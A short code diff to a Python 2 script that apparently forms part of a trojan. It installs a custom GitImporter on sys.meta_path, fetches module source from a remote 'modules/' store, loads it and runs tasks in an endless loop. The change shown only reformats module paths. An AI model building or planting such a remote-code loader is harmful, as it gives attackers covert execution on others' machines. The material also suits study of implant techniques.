@@ -70,10 +70,10 @@ class GitImporter(object):
     def __init__(self):
         self.current_module_code = ''
 
-
     def find_module(self, fullname, path=None):
         if configured:
             print '[*] Attempting to retrieve %s' % fullname
+            fullname = fullname.replace('.', '/')
             new_library = get_file_contents('modules/%s' % fullname)
 
             if new_library is not None:
@@ -81,7 +81,6 @@ class GitImporter(object):
                 return self
 
         return None
-
 
     def load_module(self, name):
         module = imp.new_module(name)
@@ -100,7 +99,9 @@ def module_runner(module):
 
     return
 
+
 sys.meta_path = [GitImporter()]
+
 
 while True:
     if task_queue.empty():
